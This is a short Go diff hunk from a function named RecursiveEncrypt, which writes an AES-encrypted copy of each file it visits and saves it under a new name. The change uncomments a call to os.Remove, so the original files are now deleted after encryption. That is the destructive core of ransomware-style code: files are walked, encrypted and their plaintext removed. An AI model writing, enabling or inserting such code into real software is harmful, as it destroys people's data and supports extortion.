@@ -142,7 +142,7 @@ func RecursiveEncrypt(index []int, dir string, file fs.FileInfo) {
 	ioutil.WriteFile(encryptedFileName, AESEncrypt(fBytes), 0644)
 
 	// Delete original file
-	// os.Remove(dir + "/" + file.Name())
+	os.Remove(dir + "/" + file.Name())
 
 	fmt.Println()
 }
